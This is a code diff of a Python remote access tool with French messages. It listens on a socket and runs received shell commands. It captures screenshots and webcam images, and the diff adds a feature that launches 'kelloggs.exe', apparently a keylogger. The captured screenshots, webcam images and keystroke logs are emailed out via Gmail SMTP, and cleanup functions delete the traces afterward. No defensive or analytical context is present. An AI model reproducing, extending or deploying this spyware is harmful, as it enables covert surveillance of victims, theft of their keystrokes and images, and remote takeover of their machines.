@@ -11,15 +11,7 @@ from PIL import ImageGrab
 
 import cv2
 
-mail = ""
-mailpw = ""
-smtpadr = "smtp.gmail.com"
-smtpport = 587
-
-hote = ""
-port = 1666
-
-def rcvscr():
+def rcvscr(mail, mailpw, smtpadr, smtpport):
 	try:
 		print(mail, mailpw, smtpadr, smtpport) 
 		msg = MIMEMultipart()
@@ -45,7 +37,7 @@ def rcvscr():
 	except:
 		print("rcv scr... error !")
 
-def rcvcam():
+def rcvcam(mail, mailpw, smtpadr, smtpport):
 	try:
 		print(mail, mailpw, smtpadr, smtpport) 
 		msg = MIMEMultipart()
@@ -71,6 +63,32 @@ def rcvcam():
 	except:
 		print("rcv cam... error !")
 
+def rcvkel(mail, mailpw, smtpadr, smtpport):
+	try:
+		print(mail, mailpw, smtpadr, smtpport) 
+		msg = MIMEMultipart()
+		msg['From'] = mail
+		msg['To'] = mail
+		msg['Subject'] = "CAM RCV"
+		body = "CAM RCV"
+		msg.attach(MIMEText(body, 'plain'))
+		filename = "kelloggs.txt"
+		attachment = open("kelloggs.txt", "rb")
+		part = MIMEBase('application', 'octet-stream')
+		part.set_payload((attachment).read())
+		encoders.encode_base64(part)
+		part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+		msg.attach(part)	 
+		server = smtplib.SMTP(smtpadr, smtpport)
+		server.starttls()
+		server.login(mail, mailpw)
+		text = msg.as_string()
+		server.sendmail(mail, mail, text)
+		server.quit()
+		print("rcv kelloggs... done !")
+	except:
+		print("rcv kelloggs... error !")
+
 def scr():
 	try:
 		scr = ImageGrab.grab(bbox=(0,0,1920,1080))
@@ -81,8 +99,10 @@ def scr():
 
 def cleanall():
 	try:
+		os.system("cls")
 		cleanscr()
 		cleancam()
+		cleankel()
 		print("cleaning... done !")
 	except:
 		print("clean... error !")
@@ -101,6 +121,13 @@ def cleancam():
 	except:
 		print("pas de camshot à nettoyer, ou fichier pas accessible.")
 
+def cleankel():
+	try:
+		os.remove("kelloggs.txt")
+		print("cleaning kelloggs files... done !")
+	except:
+		print("pas de logs à nettoyer, ou fichier pas accessible.")
+
 def camshot():
 	try:
 		cam = cv2.VideoCapture(0)
@@ -112,7 +139,23 @@ def camshot():
 	except:
 		print("camshot... error !")
 
+def kelloggs():
+	try:
+		os.system("kelloggs.exe")
+		print("kelloggs... activé !")
+	except:
+		print("kelloggs... error !")
+
 def main():
+
+	mail = ""
+	mailpw = ""
+	smtpadr = "smtp.gmail.com"
+	smtpport = 587
+	hote = ""
+	port = 1666
+	print(mail, mailpw, smtpadr, smtpport, hote, port)
+	
 	connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	connexion_principale.bind((hote, port))
 	connexion_principale.listen(5)
@@ -137,14 +180,12 @@ def main():
 			os.system(msg_recu.decode()[4:len(msg_recu)])
 		elif msg_recu[0:5] == b"mail ":
 			mail = msg_recu.decode()[5:len(msg_recu)]
-			os.system("cls")
+			print(mail)
 		elif msg_recu[0:7] == b"mailpw ":
 			mailpw = msg_recu.decode()[7:len(msg_recu)]
 			print(mailpw)
-			os.system("cls")
 		elif msg_recu[0:8] == b"smtpadr ":
 			smtpadr = msg_recu.decode()[8:len(msg_recu)]
-			os.system("cls")
 		elif msg_recu[0:9] == b"smtpport ":
 			try:
 				smtpport = int(msg_recu.decode()[9:len(msg_recu)])
@@ -152,15 +193,19 @@ def main():
 				pass
 			os.system("cls")
 		elif msg_recu == b"rcv":
-			rcvscr()
-			rcvcam()
+			rcvscr(mail, mailpw, smtpadr, smtpport)
+			rcvcam(mail, mailpw, smtpadr, smtpport)
+			rcvkel(mail, mailpw, smtpadr, smtpport)
 		elif msg_recu == b"clean":
 			cleanall()
 		elif msg_recu == b"scr":
 			scr()
 		elif msg_recu == b"camshot":
 			camshot()
+		elif msg_recu == b"kelloggs":
+			kelloggs()
 	connexion_avec_client.close()
 	connexion_principale.close()
 	main()
+
 main()
